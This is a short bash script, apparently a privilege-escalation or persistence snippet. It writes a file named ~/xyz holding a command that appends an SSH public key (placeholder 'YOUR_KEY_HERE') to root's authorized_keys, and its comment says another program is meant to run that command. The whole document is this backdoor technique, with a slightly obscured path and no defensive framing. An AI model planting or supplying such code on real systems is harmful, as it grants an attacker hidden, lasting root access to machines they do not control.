#!/bin/bash

# Add command to include a public key in authorized keys, run by another program

echo 'echo' \''ssh-rsa YOUR_KEY_HERE'\' '>> /root/./.ssh/authorized_keys' > ~/xyz
